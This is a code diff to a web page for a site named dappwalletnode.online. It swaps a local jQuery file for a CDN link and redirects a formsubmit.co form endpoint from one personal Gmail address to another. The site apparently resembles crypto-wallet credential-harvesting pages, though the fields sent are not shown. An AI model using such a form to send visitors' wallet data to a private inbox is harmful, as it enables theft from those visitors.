@@ -48,7 +48,7 @@
   <p>  info@dappwalletnode.online</p></br>
     <p>Copyright © 2021 All rights Reserved </p>
   </footer>
-  <script type='text/javascript' src='js/jquery-3.6.0.min.js'></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script type="text/javascript">
   $('#cont').click(function() {
     var contact_name = document.getElementById('contact_name').value;
@@ -61,7 +61,7 @@
     else{
     $.ajax({
   method: 'POST',
-  url: 'https://formsubmit.co/ajax/ijoba2529@gmail.com',
+  url: 'https://formsubmit.co/ajax/muizazeez2004@gmail.com',
   dataType: 'json',
   accepts: 'application/json',
   data: {
